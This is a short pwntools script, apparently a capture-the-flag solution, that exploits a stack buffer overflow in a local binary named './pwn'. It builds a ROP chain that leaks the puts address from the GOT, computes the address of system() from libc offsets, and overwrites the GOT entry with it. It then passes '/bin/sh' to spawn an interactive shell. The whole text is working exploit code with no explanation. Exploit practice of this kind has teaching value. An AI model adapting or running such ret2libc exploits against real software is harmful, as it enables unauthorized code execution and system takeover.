from pwn import*
#context.log_level="debug"
e=ELF("./pwn")
puts_plt=e.plt['puts']
gets_plt=e.plt['gets']
puts_got=e.got['puts']
print "puts_plt:"+hex(puts_plt)
print "gets_plt:"+hex(gets_plt)
print "puts_got:"+hex(puts_got)
pop_rdi=0x4006f3 
print "pop_rdi:" +hex(pop_rdi)

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
off=libc.symbols['system']-libc.symbols['puts']
print "off:"+hex(off)
payload="A"*40+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
payload+=p64(pop_rdi)+p64(puts_got)+p64(gets_plt)
payload+=p64(pop_rdi)+p64(puts_got+8)+p64(puts_plt)


s=process("./pwn")
s.recvuntil(":")
s.sendline(payload)
s.recvuntil("tie3\n")
puts_addr=u64(s.recvuntil("\n")[:-1].ljust(8,"\x00"))
print "puts_addr: "+hex(puts_addr)
system_addr=puts_addr+off
print "system_addr:"+hex(system_addr)
s.sendline(p64(system_addr)+"/bin/sh")
s.interactive()

